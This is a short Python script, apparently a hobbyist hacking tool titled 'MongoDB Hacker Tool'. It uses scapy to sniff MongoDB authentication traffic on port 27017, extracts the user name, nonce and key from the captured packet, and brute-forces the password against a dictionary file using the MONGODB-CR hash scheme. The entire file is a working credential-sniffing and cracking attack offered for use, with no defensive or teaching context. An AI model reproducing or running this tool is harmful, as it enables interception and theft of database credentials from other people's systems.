#!/usr/bin/python
#coding: utf8
__author__ = "cyber-punk"

from scapy.all import *
import re
import hashlib

md5 = hashlib.md5

print "*********************\n*MongoDB Hacker Tool*\n***Sniff and Brute***\n*********************\n"


def get_packets(port, iface, count):
	packets = sniff(filter="port "+str(port)+"", count=count, iface=str(iface))
	return packets

def parse_packets(port, iface, count):
	print "Sniff packages..."
	packets = get_packets(port, iface, count)
	print "Parse packages..."
	for i in xrange(len(packets)):
		if "key" in re.findall(r'[A-Za-z0-9]{3,}', str(packets[i])):
			packet=packets[i]
			break
	user = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[4]
	nonce = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[6]
	key = re.findall(r'[A-Za-z0-9]{3,}', str(packet))[8]
	return user, nonce, key


def gen_pass(user, nonce, passw):
	return md5(nonce + user + md5(user + ":mongo:" + str(passw)).hexdigest()).hexdigest();


def brute_pass():
	user, nonce, key = parse_packets("27017", "lo", 10)
	print "Prepair to brute..."
	file = open('dict.txt')
	file_len = open('dict.txt')
	for i in xrange(len(file_len.readlines())):
		passw = file.readline().split('\n')[0]
		if gen_pass(user, nonce, passw) == key:
			print "\nFound - "+user+":"+passw
			break
		

brute_pass()